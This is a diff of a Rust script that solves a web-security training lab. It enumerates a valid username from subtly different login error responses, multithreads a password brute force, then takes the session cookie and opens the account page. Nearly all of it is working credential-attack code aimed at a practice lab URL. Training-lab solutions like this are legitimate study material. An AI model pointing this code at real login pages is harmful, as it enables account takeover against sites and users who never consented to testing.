@@ -1,456 +1,263 @@
 /****************************************************************************
 *
-* Author: Ahmed Elqalaawy (@elqal3awii)
+* Lab: Username enumeration via account lock
 *
-* Date: 26/8/2023
-*
-* Lab: Username enumeration via subtly different responses
-*
-* Steps: 1. Enumerate a valid username via subtly different error messages
-*        2. Brute force password of that valid username
+* Hack Steps:
+*      1. Read usernames and passwords lists
+*      2. Try to find a valid username via subtly different error messages
+*      3. Brute force the password of that valid username
+*      4. Login with the valid credentials
 *
 *****************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
-use atomic_counter::{self, RelaxedCounter};
 use lazy_static::lazy_static;
-use rayon::{
-    current_thread_index,
-    prelude::{IntoParallelRefIterator, ParallelIterator},
-    ThreadPool,
-};
+use rayon::iter::{IntoParallelRefIterator, ParallelIterator};
 use regex::{self, Regex};
 use reqwest::{
-    blocking::{Client, ClientBuilder},
+    blocking::{Client, ClientBuilder, Response},
     redirect::Policy,
+    Error,
 };
 use std::{
     collections::HashMap,
-    fs::{self, OpenOptions},
+    fs::{self},
     io::{self, Write},
-    ops::Add,
     process,
     sync::{
-        atomic::{AtomicUsize, Ordering},
+        atomic::{AtomicBool, AtomicUsize, Ordering},
         Arc, Mutex,
     },
-    thread,
     time::{self, Duration, Instant},
 };
 use text_colorizer::Colorize;
 
-/******************
-* Global variables
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0a620051049b36b380375d6f00180014.web-security-academy.net";
+
 lazy_static! {
-    static ref VALID_USER: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
+    static ref VALID_USERNAME: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
+    static ref VALID_USERNAME_IS_FOUND: AtomicBool = AtomicBool::new(false);
+    static ref USERSNAMES_COUNTER: AtomicUsize = AtomicUsize::new(0);
     static ref VALID_PASSWORD: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
-    static ref FAILED_USERS: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
-    static ref FAILED_PASSWORDS: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
-    static ref USERS_COUNTER: AtomicUsize = AtomicUsize::new(0);
+    static ref VALID_PASSWORD_IS_FOUND: AtomicBool = AtomicBool::new(false);
     static ref PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
-    static ref FAILED_USERS_COUNTER: AtomicUsize = AtomicUsize::new(0);
-    static ref FAILED_PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
+    static ref VALID_SESSION: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
+    static ref SCRIPT_START_TIME: Instant = time::Instant::now();
+    static ref WEB_CLIENT: Client = build_web_client();
 }
 
-/******************
-* Main Function
-*******************/
 fn main() {
-    // change this to your lab URL
-    let url = "https://0afd0062041235fd81ec66ea00d50037.web-security-academy.net/login";
+    print!("⦗1⦘ Reading usernames list.. ");
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
+    let usernames_list = read_list("../../usernames.txt"); // Make sure the file exist in your root directory or change its path accordingly
+    let total_usernames_count = usernames_list.iter().count();
 
-    // read usernames as one big string
-    // change the path to your usrename list
-    let usernames_big_string = fs::read_to_string("/home/ahmed/users").unwrap();
+    let threads = 8; // You can experiment with the number of threads by adjusting this variable
+    let mini_usernames_lists = build_mini_lists_for_threads(&usernames_list, threads);
 
-    // split the big string to a list of usernames
-    // change the separator to \r\n if you are still a windows user
-    let usernames = usernames_big_string.split("\n").collect();
+    println!("{}", "OK".green());
+    print!("⦗2⦘ Reading password list.. ");
 
-    // read passwords as one big string
-    // change the path to your password list
-    let passwords_big_string = fs::read_to_string("/home/ahmed/passwords").unwrap();
+    let password_list = read_list("../../passwords.txt"); // Make sure the file exist in your root directory or change its path accordingly
+    let total_password_count = password_list.iter().count();
 
-    // split the big string to a list of passwords
-    // change the separator to \r\n if you are still a windows user
-    let passwords = passwords_big_string.split("\n").collect();
+    let threads = 8; // You can experiment with the number of threads by adjusting this variable
+    let mini_password_lists = build_mini_lists_for_threads(&password_list, threads);
 
-    // capture the time before brute forcing
-    let start_time = time::Instant::now();
+    println!("{}", "OK".green());
+    println!("⦗3⦘ Trying to find a valid username.. ");
 
-    // start enumeration
-    // 8 is the number of threads, you can chagne it
-    enum_usernames(start_time, url, &client, usernames, 8);
+    try_to_find_valid_username_in_multiple_threads(&mini_usernames_lists, total_usernames_count);
 
-    // if a valid username is found
-    if VALID_USER.lock().unwrap().len() != 0 {
-        // start brute force his password
-        // 8 is the number of threads, you can chagne it
-        brute_force_password(
-            start_time,
-            url,
-            &client,
-            passwords,
-            VALID_USER.lock().unwrap().as_str(),
-            8,
-        );
+    let valid_user = VALID_USERNAME.lock().unwrap();
+    println!("\n🗹 Valid username: {}", valid_user.green());
+    println!("⦗4⦘ Brute forcing password.. ");
 
-        // if a valid password is found
-        if VALID_PASSWORD.lock().unwrap().len() != 0 {
-            print_valid_credentials();
-        } else {
-            println!("\n{}", "[!] Couldn't find valid password".red());
-        }
-    } else {
-        println!("\n{}", "[!] Couldn't find valid username".red());
-    }
+    brute_force_password_in_multiple_threads(
+        &valid_user,
+        &mini_password_lists,
+        total_password_count,
+    );
 
-    // print some useful information to the terminal
-    print_finish_message(start_time);
+    let valid_password = VALID_PASSWORD.lock().unwrap();
+    let new_session = VALID_SESSION.lock().unwrap();
+    println!("\n🗹 Valid username: {}", valid_user.green());
+    println!("🗹 Valid password: {}", valid_password.green());
+    print!("⦗5⦘ Logging in.. ");
 
-    // some request will be failed due to unknow reseaon
-    // print them after you finish to try them latere
-    print_failed_requests();
+    fetch_with_session("/my-account", &new_session);
 
-    // save results  to a file in the current working directory
-    // you can change this name to what you want
-    save_results(start_time, "results");
+    println!("{}", "OK".green());
+    print_finish_message();
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn build_web_client() -> Client {
     ClientBuilder::new()
-        .timeout(Duration::from_secs(5))
         .redirect(Policy::none())
+        .connect_timeout(Duration::from_secs(5))
         .build()
         .unwrap()
 }
 
-/***********************************************************************
-* Function used to enumerate usernames
-* Parameters:
-    - Instant:   to ouptut an updated elapsed time to the terminal
-    - URL: the URL of the lab
-    - client: the client we build using the build_client() function
-    - usernames: the list of gathered usernames
-    - threads: the number of threads you want the enumeration to run in
-************************************************************************/
-fn enum_usernames(
-    start_time: Instant,
-    url: &str,
-    client: &Client,
-    usernames: Vec<&str>,
-    threads: usize,
+fn read_list(file_path: &str) -> Vec<String> {
+    let passwords_big_string = fs::read_to_string(file_path)
+        .expect(&format!("Failed to read the file: {}", file_path.red()));
+    passwords_big_string.lines().map(|p| p.to_owned()).collect()
+}
+
+fn build_mini_lists_for_threads(big_list: &Vec<String>, threads: usize) -> Vec<Vec<String>> {
+    let list_per_thread_size = big_list.len() / threads;
+    big_list
+        .chunks(list_per_thread_size)
+        .map(|f| f.to_owned())
+        .collect()
+}
+
+fn try_to_find_valid_username_in_multiple_threads(
+    mini_usernames_lists: &Vec<Vec<String>>,
+    total_usernames_count: usize,
 ) {
-    println!("\n[#] Enumerate usernames..");
+    // Use every mini list in a different thread
+    mini_usernames_lists.par_iter().for_each(|mini_list| {
+        for username in mini_list {
+            let is_found = VALID_USERNAME_IS_FOUND.fetch_and(true, Ordering::Relaxed);
+            if is_found {
+                return; // Exit from the thread if the correct username was found
+            } else {
+                let counter = USERSNAMES_COUNTER.fetch_add(1, Ordering::Relaxed);
+                print_progress(counter, total_usernames_count, &username);
 
-    // how many users will be tried in each thread
-    let chunk_per_thread = usernames.len() / threads;
+                let try_to_login = login(&username, "not important");
+                if let Ok(response) = try_to_login {
+                    let body = response.text().unwrap();
+                    let text1_exist = text_exist_in_response("<!-- -->", &body);
+                    let text2_exist = text_exist_in_response(r"password\.", &body);
 
-    // split the whole list to sublist to run each one in a thread
-    let usernames_chunks: Vec<_> = usernames.chunks(chunk_per_thread).collect();
-
-    // the pattern to search for in the response
-    let regex = Regex::new("Invalid username").unwrap();
-
-    // run every sublist in a thread
-    usernames_chunks.par_iter().for_each(|mini_list| {
-        // get the total count of the usernamse
-        let total_counts = usernames.iter().count();
-
-        // iterate over every sublist in its corresponding thread
-        for (index, user) in mini_list.iter().enumerate() {
-            // iterate only if no valid user is found
-            if VALID_USER.lock().unwrap().len() == 0 {
-                // number of succeeded requests
-                let success_counter = USERS_COUNTER.fetch_add(0, Ordering::Relaxed);
-
-                // number of failed requests
-                let fail_counter = FAILED_USERS_COUNTER.fetch_add(0, Ordering::Relaxed);
-
-                // calculate the elapsed time
-                let elapsed_time = start_time.elapsed().as_secs() / 60;
-
-                // print the progress based on the updated informations
-                print_progress(
-                    elapsed_time,
-                    fail_counter,
-                    success_counter,
-                    total_counts,
-                    user,
-                );
-
-                // the data sent in the POST login request
-                let data = HashMap::from([("username", user), ("password", &"not important now")]);
-
-                // try to login
-                let mut login = client.post(url).form(&data).send();
-
-                // if login successful
-                if let Ok(res) = login {
-                    // get the body of the response
-                    let body = res.text().unwrap();
-
-                    // search for these 2 patterns in the body
-                    let pattern1 = check_pattern("<!-- -->", &body);
-                    let pattern2 = check_pattern(r"password\.", &body);
-
-                    // the compination of the 2 patterns vary from lab to another
-                    // make sure to adjust these to fit your lab
-                    if pattern1 & !pattern2 {
-                        // change this global varaible to the valid user
-                        // this is the thread-safe operation using mutexes
-                        VALID_USER.lock().unwrap().push_str(user);
+                    // The combination of the 2 patterns may vary from lab to lab
+                    // Make sure to adjust these to fit your lab or try combinations of them
+                    if text1_exist && !text2_exist {
+                        VALID_USERNAME_IS_FOUND.fetch_or(true, Ordering::Relaxed);
+                        VALID_USERNAME.lock().unwrap().push_str(username);
+                        return;
                     } else {
                         continue;
                     }
                 } else {
-                    // if the request failed try it again
-                    login = client.post(url).form(&data).send();
-                    if let Ok(res2) = login {
-                        let body = res2.text().unwrap();
-                        let pattern1 = check_pattern("<!-- -->", &body);
-                        let pattern2 = check_pattern(r"password\.", &body);
-                        if pattern1 && !pattern2 {
-                            VALID_USER.lock().unwrap().push_str(user);
-                        } else {
-                            continue;
-                        }
-                    } else {
-                        // if the request failed after 2 tries, save it to try later
-                        // add 1 to failed counter
-                        FAILED_USERS_COUNTER.fetch_add(1, Ordering::Relaxed);
-
-                        // save this user to a list to try it later
-                        FAILED_USERS.lock().unwrap().push(user.to_string());
-                    }
+                    print_failed_request(&username);
+                    continue;
                 }
-            } else {
-                // if a valid username is found, this whill cause all threads to be terminated
-                return;
             }
         }
     });
-}
 
-/***********************************************************************
-* Function used to brute force passowrd
-* Parameters:
-    - Instant: to ouptut an updated elapsed time to the terminal
-    - URL: the URL of the lab
-    - client: the client we build using the build_client() function
-    - passwords: the list of gathered usernames
-    - valid user: the valid user to brute force his password
-    - threads: the number of threads you want the enumeration to run in
-************************************************************************/
-fn brute_force_password(
-    start_time: Instant,
-    url: &str,
-    client: &Client,
-    passwords: Vec<&str>,
-    valid_user: &str,
-    threads: usize,
-) {
-    println!("");
-    println!(
-        "{}: {}",
-        "✅ Valid user".white().bold(),
-        valid_user.green().bold()
-    );
-    println!("\n[#] Brute forcing password..");
-
-    // how many passwords will be tried in each thread
-    let chunk_per_thread = passwords.len() / threads;
-
-    // split the whole list to sublist to run each one in a thread
-    let passwords_chunks: Vec<_> = passwords.chunks(chunk_per_thread).collect();
-
-    // run every sublist in a thread
-    passwords_chunks.par_iter().for_each(|mini_list| {
-        // get total number of passwords that will be tried
-        let total_counts = passwords.iter().count();
-
-        // iterate over every sublist in its corresponing thread
-        for (index, password) in mini_list.iter().enumerate() {
-            // iterate only if no valid password is found
-            if VALID_PASSWORD.lock().unwrap().len() == 0 {
-                // update the success counter to output in the terminal
-                let success_counter = PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);
-
-                // update the failed counter to output in the terminal
-                let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed);
-
-                // calculate the elapsed time
-                let elapsed_time = start_time.elapsed().as_secs() / 60;
-
-                // print the updated information to the terminal
-                print_progress(
-                    elapsed_time,
-                    fail_counter,
-                    success_counter,
-                    total_counts,
-                    password,
-                );
-
-                // the POST date to submit
-                let data = HashMap::from([("username", valid_user), ("password", password)]);
-
-                // try to login
-                let mut login = client.post(url).form(&data).send();
-
-                // if the request succeeded
-                if let Ok(res) = login {
-                    // if the password is true
-                    if res.status().as_u16() == 302 {
-                        // update the global variable to the valid password
-                        // this is a thread-safe operation using mutexes
-                        VALID_PASSWORD.lock().unwrap().push_str(password)
-                    }
-                } else {
-                    // if the request faild for unknown reason try to send it again
-                    login = client.post(url).form(&data).send();
-                    if let Ok(res) = login {
-                        if res.status().as_u16() == 302 {
-                            VALID_PASSWORD.lock().unwrap().push_str(password)
-                        }
-                    } else {
-                        // if the repeated request also failed,
-                        // upate the counter and save the password to try it later
-                        FAILED_PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);
-                        FAILED_PASSWORDS.lock().unwrap().push(password.to_string());
-                    }
-                }
-            } else {
-                return;
-            }
-        }
-    });
-}
-
-/*************************************
-* Function used print the update info
-* to the terminal in a nice format
-**************************************/
-#[inline(always)]
-fn print_progress(
-    elapsed_time: u64,
-    fail_counter: usize,
-    success_counter: usize,
-    total_counts: usize,
-    text: &str,
-) {
-    print!(
-        "\r{}: {:3} minutes || {}: {:3} || {} ({}/{}): {:50}",
-        "Elapsed".yellow().bold(),
-        elapsed_time,
-        "Failed".red().bold(),
-        fail_counter,
-        "Trying".white().bold(),
-        success_counter,
-        total_counts,
-        text.blue().bold()
-    );
-    io::stdout().flush().unwrap();
-}
-
-/********************************************************
-* Function used to print the valid username and password
-*********************************************************/
-fn print_valid_credentials() {
-    println!(
-        "\n{}: username: {}, password: {}",
-        "✅ Login successfully".white(),
-        VALID_USER.lock().unwrap().green().bold(),
-        VALID_PASSWORD.lock().unwrap().green().bold()
-    );
-}
-/********************************************************
-* Function used to print finish time
-*********************************************************/
-#[inline(always)]
-fn print_finish_message(start_time: Instant) {
-    println!(
-        "\n{}: {:?} minutes",
-        "✅ Finished in".green().bold(),
-        start_time.elapsed().as_secs() / 60
-    );
-}
-/****************************************************
-* Function used print failed usernames and password
-* that we tried 2 times earlier and also failed
-*****************************************************/
-#[inline(always)]
-fn print_failed_requests() {
-    let failed_users = FAILED_USERS.lock().unwrap();
-    println!(
-        "\n\n{}: {} \n{}: {:?}",
-        "[!] Failed users count".red().bold(),
-        failed_users.len().to_string().yellow().bold(),
-        "[!] Failed users".red().bold(),
-        failed_users
-    );
-    let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
-    println!(
-        "\n\n{}: {} \n{}: {:?}",
-        "[!] Failed password count".red().bold(),
-        failed_passwords.len().to_string().yellow().bold(),
-        "[!] Failed password".red().bold(),
-        failed_passwords
-    )
-}
-
-/*********************************************
-* Function used to save results to a txt file
-**********************************************/
-fn save_results(start_time: Instant, file_name: &str) {
-    let failed_users = FAILED_USERS.lock().unwrap();
-    let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
-    let valid_user = VALID_USER.lock().unwrap();
-    let valid_pass = VALID_PASSWORD.lock().unwrap();
-    let to_save = format!(
-        "✅ Finished in: {elapsed_time:?} minutes \n\n\
-    Username: {user}, Password: {pass} \n\n\
-    [!] Failed users count: {fusers_count} \n\
-    [!] Failed users: {fusers:?} \n\n\
-    [!] Failed passwords count: {fpasswords_count} \n\
-    [!] Failed passwords: {fpasswords:?} \n\n",
-        elapsed_time = start_time.elapsed().as_secs() / 60,
-        fusers_count = failed_users.len(),
-        fusers = failed_users,
-        fpasswords = failed_passwords,
-        fpasswords_count = failed_passwords.len(),
-        user = valid_user,
-        pass = valid_pass
-    );
-    let new_file = fs::File::create(file_name);
-    if let Ok(mut file_created) = new_file {
-        write!(file_created, "{}", to_save);
-        println!(
-            "\n{}: {}",
-            "Restults was saved to".yellow().bold(),
-            file_name.green().bold()
-        )
+    let is_found = VALID_USERNAME_IS_FOUND.fetch_and(true, Ordering::Relaxed);
+    if is_found {
+        return;
     } else {
-        println!("\n{}", "[!] Couldn't create new file to save results".red());
+        println!("{}", "\n⦗!⦘ No valid username was found".red());
+        process::exit(1);
     }
 }
 
-/****************************************************
-* Function to check a pattern in a text
-*****************************************************/
-fn check_pattern(pattern: &str, text: &str) -> bool {
-    if let Some(result) = Regex::new(pattern).unwrap().find(text) {
+fn text_exist_in_response(text: &str, body: &String) -> bool {
+    let regex = Regex::new(text).unwrap();
+    if regex.find(body).is_some() {
         true
     } else {
         false
     }
+}
+
+fn brute_force_password_in_multiple_threads(
+    valid_username: &str,
+    mini_password_lists: &Vec<Vec<String>>,
+    total_password_count: usize,
+) {
+    // Use every mini list in a different thread
+    mini_password_lists.par_iter().for_each(|mini_list| {
+        for password in mini_list {
+            let is_found = VALID_PASSWORD_IS_FOUND.fetch_and(true, Ordering::Relaxed);
+            if is_found {
+                return; // Exit from the thread if the correct password was found
+            } else {
+                let counter = PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);
+                print_progress(counter, total_password_count, &password);
+
+                let try_to_login = login(&valid_username, &password);
+                if let Ok(response) = try_to_login {
+                    if response.status().as_u16() == 302 {
+                        let session = get_session_cookie(&response);
+                        VALID_PASSWORD_IS_FOUND.fetch_or(true, Ordering::Relaxed);
+                        VALID_PASSWORD.lock().unwrap().push_str(&password);
+                        VALID_SESSION.lock().unwrap().push_str(&session);
+                        return;
+                    } else {
+                        continue;
+                    }
+                } else {
+                    print_failed_request(&password);
+                    continue;
+                }
+            }
+        }
+    });
+
+    let is_found = VALID_PASSWORD_IS_FOUND.fetch_and(true, Ordering::Relaxed);
+    if is_found {
+        return;
+    } else {
+        println!("{}", "\n⦗!⦘ No valid password was found".red());
+        process::exit(1);
+    }
+}
+
+fn login(username: &str, password: &str) -> Result<Response, Error> {
+    let data = HashMap::from([("username", username), ("password", password)]);
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/login"))
+        .form(&data)
+        .send()
+}
+
+fn fetch_with_session(path: &str, session: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .header("Cookie", format!("session={session}"))
+        .send()
+        .expect(&format!("{}", "Failed to fetch carlos profile".red()))
+}
+
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*);", cookie_header)
+}
+
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+fn print_progress(counter: usize, total_count: usize, text: &str) {
+    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs()).to_string();
+    print!(
+        "\r❯❯ Elapsed: {:2} seconds || Trying ({}/{total_count}): {:50}",
+        elapsed_time.yellow(),
+        counter + 1,
+        text.blue()
+    );
+    io::stdout().flush().unwrap();
+}
+
+fn print_finish_message() {
+    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs()).to_string();
+    println!("🗹 Finished in: {} seconds", elapsed_time.yellow());
+    println!("🗹 The lab should be marked now as {}", "solved".green());
+}
+
+fn print_failed_request(text: &str) {
+    println!("{} {}", "\n⦗!⦘ Failed to try:".red(), text.red())
 }
